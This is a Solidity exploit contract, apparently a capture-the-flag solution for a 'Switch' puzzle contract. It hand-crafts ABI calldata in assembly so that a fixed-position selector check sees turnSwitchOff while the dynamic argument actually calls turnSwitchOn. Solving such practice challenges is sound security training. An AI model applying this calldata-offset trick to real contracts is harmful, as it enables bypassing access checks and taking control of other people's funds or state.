// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;
import "../../src/Switch/Switch.sol";
import "../BlockUtils.sol";
import "forge-std/console.sol";

contract SwitchExploit is BlockUtils {
    Switch victim;
    
    constructor(address _victim) {
        victim = Switch(payable(_victim));
    }

    function hack() public {
        bytes4 flipSwitchSelector = bytes4(keccak256("flipSwitch(bytes)"));
        bytes4 turnOnSelector = bytes4(keccak256("turnSwitchOn()"));
        bytes4 turnOffSelector = bytes4(keccak256("turnSwitchOff()"));

        // Offset to _data within calldata
        uint256 offsetToData = 68;

        // Total calldata length: 4 (function selector) + 32 (offset) + 32 (length of _data) + 4 (offSelector) + 32 (length of inner _data) + 4 (turnOnSelector)
        bytes memory data = new bytes(4 + 32 + 32 + 4 + 32 + 4);

        assembly {
            let ptr := add(data, 32)
            mstore(ptr, flipSwitchSelector)               // [0-3]: flipSwitch selector
            mstore(add(ptr, 4), offsetToData)             // [4-35]: offset to _data (68)
            mstore(add(ptr, 36), 4)                       // [36-67]: length of _data (4 bytes)
            mstore(add(ptr, 68), turnOffSelector)         // [68-71]: offSelector (to pass onlyOff)
            mstore(add(ptr, 72), 4)                       // [72-103]: length of inner _data (4 bytes)
            mstore(add(ptr, 104), turnOnSelector)         // [104-107]: turnSwitchOn() selector
        }

        // Make the call using low-level call
        (bool success, ) = address(victim).call(data);
        require(success, "call failed");
    }
}